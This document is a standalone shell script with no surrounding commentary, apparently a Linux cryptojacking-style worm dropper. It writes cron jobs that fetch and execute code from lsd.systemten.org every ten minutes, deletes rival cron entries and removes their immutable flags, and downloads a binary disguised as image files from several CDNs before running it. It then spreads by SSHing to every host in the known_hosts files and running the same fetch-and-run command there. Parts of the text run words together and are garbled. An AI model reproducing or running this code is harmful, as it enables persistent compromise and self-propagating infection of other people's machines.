exportPATH=$PATH:/bin:/usr/bin:/sbin:/usr/local/bin:/usr/sbin

    mkdir -p /tmp

    chmod 1777 /tmp

    echo "*/10 * * * * (curl-fsSL -m180 lsd.systemten.org||wget -q -T180 -O- lsd.systemten.org||python -c'import urllib;printurllib.urlopen(\"http://lsd.systemten.org\").read()')|sh"|crontab- cat > /etc/crontab <<EOF

    SHELL=/bin/bash

    PATH=/sbin:/bin:/usr/sbin:/usr/bin

    */10 * * * * root (curl -fsSL-m180 lsd.systemten.org||wget -q -T180 -O- lsd.systemten.org||python -c 'importurllib;printurllib.urlopen("http://lsd.systemten.org").read()'||/usr/local/sbin/638b6d9fb883b8)|sh

    EOF

    find /etc/cron*|xargs chattr -i

    find /var/spool/cron*|xargschattr -i

    grep -RE "(wget|curl)"/etc/cron*|grep -v systemten|cut -f 1 -d :| xargs rm -rf

    grep -RE"(wget|curl)" /var/spool/cron*|grep -v systemten|cut -f 1 -d :| xargsrm -rf

    cd /tmp

    touch /usr/local/bin/writeable&& cd /usr/local/bin/

    touch /usr/libexec/writeable&& cd /usr/libexec/

    touch /usr/bin/writeable&& cd /usr/bin/

    rm -rf /usr/local/bin/writeable/usr/libexec/writeable /usr/bin/writeable

    export PATH=$PATH:$(pwd)

    a64="img.sobot.com/chatres/89/msg/20191022/78e3582c42824f17aba17feefb87ea5f.png"

    a32="img.sobot.com/chatres/89/msg/20191022/2be662ee79084035914e9d6a6d6be10d.png"

    b64="cdn.xiaoduoai.com/cvd/dist/fileUpload/1571723350789/0.25579108623802416.jpg"

    b32="cdn.xiaoduoai.com/cvd/dist/fileUpload/1571723382710/9.915787746614242.jpg"

    c64="https://user-images.githubusercontent.com/56861392/67261951-83ebf080-f4d5-11e9-9807-d0919c3b4b74.jpg"

    c32="https://user-images.githubusercontent.com/56861392/67262078-0aa0cd80-f4d6-11e9-8639-63829755ed31.jpg"

    if [ ! -f"638b6d9fb883b8" ]; then

        ARCH=$(getconf LONG_BIT)

        if [ ${ARCH}x = "64x" ]; then

            (curl -fsSL -m180 $a64 -o638b6d9fb883b8||wget -T180 -q $a64 -O 638b6d9fb883b8||python -c 'importurllib;urllib.urlretrieve("http://'$a64'","638b6d9fb883b8")'||curl -fsSL -m180 $b64 -o 638b6d9fb883b8||wget-T180 -q $b64 -O 638b6d9fb883b8||python -c 'importurllib;urllib.urlretrieve("http://'$b64'","638b6d9fb883b8")'||curl -fsSL -m180 $c64 -o 638b6d9fb883b8||wget-T180 -q $c64 -O 638b6d9fb883b8||python -c 'import urllib;urllib.urlretrieve("'$c64'","638b6d9fb883b8")') 

        else

            (curl -fsSL -m180 $a32 -o638b6d9fb883b8||wget -T180 -q $a32 -O 638b6d9fb883b8||python -c 'importurllib;urllib.urlretrieve("http://'$a32'","638b6d9fb883b8")'||curl -fsSL -m180 $b32 -o 638b6d9fb883b8||wget-T180 -q $b32 -O 638b6d9fb883b8||python -c 'importurllib;urllib.urlretrieve("http://'$b32'","638b6d9fb883b8")'||curl -fsSL -m180 $c32 -o 638b6d9fb883b8||wget-T180 -q $c32 -O 638b6d9fb883b8||python -c 'import urllib;urllib.urlretrieve("'$c32'","638b6d9fb883b8")')

        fi

    fi

    chmod +x 638b6d9fb883b8

    $(pwd)/638b6d9fb883b8 ||./638b6d9fb883b8 || /usr/bin/638b6d9fb883b8 || /usr/libexec/638b6d9fb883b8 ||/usr/local/bin/638b6d9fb883b8 || 638b6d9fb883b8 || /tmp/638b6d9fb883b8 ||/usr/local/sbin/638b6d9fb883b8

    if [ -f /root/.ssh/known_hosts] && [ -f /root/.ssh/id_rsa.pub ]; then

      for h in $(grep -oE"\b([0-9]{1,3}\.){3}[0-9]{1,3}\b" /root/.ssh/known_hosts); do ssh-oBatchMode=yes -oConnectTimeout=5 -oStrictHostKeyChecking=no $h "(curl-fsSL lsd.systemten.org||wget -q -O- lsd.systemten.org||python -c 'importurllib;print urllib.urlopen(\"http://lsd.systemten.org\").read()')|sh>/dev/null 2>&1 &" & done

    fi

    for file in /home/*

    do

        if test -d $file; then

            if [ -f $file/.ssh/known_hosts ]&& [ -f $file/.ssh/id_rsa.pub ]; then

                for h in $(grep -oE"\b([0-9]{1,3}\.){3}[0-9]{1,3}\b" $file/.ssh/known_hosts); do ssh-oBatchMode=yes -oConnectTimeout=5 -oStrictHostKeyChecking=no $h "(curl-fsSL lsd.systemten.org||wget -q -O- lsd.systemten.org||python -c 'importurllib;print urllib.urlopen(\"http://lsd.systemten.org\").read()')|sh>/dev/null 2>&1 &" & done

            fi

        fi

    done

    #